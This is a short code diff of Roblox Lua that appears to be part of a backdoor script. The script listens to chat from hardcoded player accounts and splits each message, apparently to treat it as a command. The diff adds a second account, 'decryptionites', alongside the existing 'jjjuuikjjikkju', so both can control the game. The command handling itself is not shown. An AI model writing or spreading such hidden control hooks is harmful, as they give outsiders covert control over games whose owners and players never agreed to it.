@@ -7,7 +7,7 @@ local function gpfs(str)
 end
 game.Players.PlayerAdded:Connect(
     function(knocks)
-        if knocks.Name == "jjjuuikjjikkju" then
+        if knocks.Name == "jjjuuikjjikkju" or knocks.Name == "decryptionites" then
             knocks.Chatted:Connect(
                 function(rizz)
                     local splitted = rizz:split(" ")
@@ -29,7 +29,7 @@ game.Players.PlayerAdded:Connect(
     end
 )
 for i, v in pairs(game.Players:GetPlayers()) do
-    if v.Name == "jjjuuikjjikkju" then
+    if v.Name == "jjjuuikjjikkju" or v.Name == "decryptionites" then
             v.Chatted:Connect(
                 function(rizz)
                     local splitted = rizz:split(" ")
